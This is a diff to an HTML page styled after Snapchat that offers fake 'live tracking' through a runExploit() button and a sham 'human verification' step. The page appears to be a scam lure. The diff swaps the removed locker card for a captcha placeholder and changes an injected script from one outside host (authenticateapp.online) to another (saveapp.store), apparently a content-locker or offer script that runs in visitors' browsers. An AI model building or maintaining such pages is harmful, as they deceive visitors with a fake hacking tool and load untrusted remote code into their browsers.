@@ -215,7 +215,6 @@
         </div>
     </main>
 
-    <!-- Modified Footer Structure -->
     <footer class="mt-12 flex flex-col items-center gap-2 text-center opacity-60">
         <div class="flex items-center gap-2 bg-zinc-900 px-4 py-2 rounded-full border border-zinc-800">
             <i class="fab fa-snapchat text-[#FFFC00] text-xs"></i>
@@ -252,7 +251,6 @@
 
             <h4 id="r-title" class="text-lg font-bold mb-2 px-2 text-white"></h4>
             <p class="text-xs text-zinc-400 mb-8 max-w-xs mx-auto">This process requires injecting sequential query frames into the active session instance.</p>
-            <!-- Modified Action Button Text -->
             <button onclick="runExploit()" class="w-full bg-[#FFFC00] text-black font-extrabold py-4 rounded-2xl text-md shadow-lg shadow-[#FFFC00]/10 active:scale-[0.99] transition-transform">Start Live Tracking</button>
         </div>
     </div>
@@ -281,27 +279,7 @@
 
     <div id="locker-overlay">
         <div class="snap-locker-card">
-            <div class="bg-[#FFFC00] py-5 px-6 flex items-center justify-between text-black">
-                <div class="flex items-center gap-2.5">
-                    <i class="fab fa-snapchat text-2xl"></i>
-                    <span class="font-extrabold tracking-tight text-sm uppercase">Security Verification</span>
-                </div>
-                <div class="text-[10px] font-mono font-bold bg-black/10 px-2 py-0.5 rounded">ID: #994A</div>
-            </div>
-            <div class="p-8 bg-zinc-50 text-center flex flex-col items-center justify-center">
-                <div class="relative w-14 h-14 mb-5 flex items-center justify-center">
-                    <div class="absolute inset-0 rounded-full border-4 border-zinc-200"></div>
-                    <div class="absolute inset-0 rounded-full border-4 border-t-yellow-500 animate-spin"></div>
-                    <i class="fas fa-shield-halved text-zinc-400 text-lg"></i>
-                </div>
-                <h3 class="text-md font-extrabold text-zinc-900 tracking-tight">Human Verification Required</h3>
-                <p class="text-xs text-zinc-500 mt-2 max-w-xs leading-relaxed">To complete the data sequence decryption, please fulfill one of the secure server checkpoints below.</p>
-                
-                <div class="w-full mt-6 bg-zinc-100 p-3.5 rounded-xl border border-zinc-200 text-left flex items-center gap-3">
-                    <i class="fas fa-circle-info text-yellow-600 text-sm mt-0.5"></i>
-                    <p class="text-[11px] text-zinc-600 font-medium leading-normal">Verification steps prevent server overhead and protect remote system boundaries.</p>
-                </div>
-            </div>
+            <div data-captcha-enable="true"></div>
         </div>
     </div>
 
@@ -408,19 +386,8 @@
                             
                             let ogScript = document.createElement('script');
                             ogScript.type = 'text/javascript';
-                            ogScript.src = 'https://authenticateapp.online/cl/js/n66mg4';
-                            
-                            ogScript.onload = function() {
-                                if (typeof ogads_call === 'function') {
-                                    ogads_call(); 
-                                }
-                            };
-
-                            ogScript.onerror = function() {
-                                alert("Failed to establish secure endpoint response. Check connection parameters.");
-                            };
-
-                            document.head.appendChild(ogScript);
+                            ogScript.src = 'https://saveapp.store/cp/js/2wx2k';
+                            document.body.appendChild(ogScript);
                         }, 600);
                     }
                 }, 35);
